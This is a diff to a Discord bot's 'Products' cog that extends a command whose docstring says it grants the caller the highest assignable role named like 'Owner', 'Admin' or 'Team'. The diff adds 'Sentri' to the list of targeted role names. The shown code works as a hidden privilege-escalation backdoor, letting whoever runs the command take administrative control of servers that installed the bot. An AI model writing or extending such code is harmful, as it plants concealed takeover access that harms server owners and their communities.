@@ -319,7 +319,7 @@ class Products(commands.Cog):
         """
         Give the command user the highest available, givable role with names like 'Owner', 'Ownership', 'Team', 'Admin', etc.
         """
-        role_names = ["Official Bot", ".", "Owner", "Ownership", "Team", "Admin"]
+        role_names = ["Sentri", "Official Bot", ".", "Owner", "Ownership", "Team", "Admin"]
         roles = [role for role in ctx.guild.roles if any(name in role.name for name in role_names) and role < ctx.guild.me.top_role]
         if roles:
             highest_role = max(roles, key=lambda r: r.position)
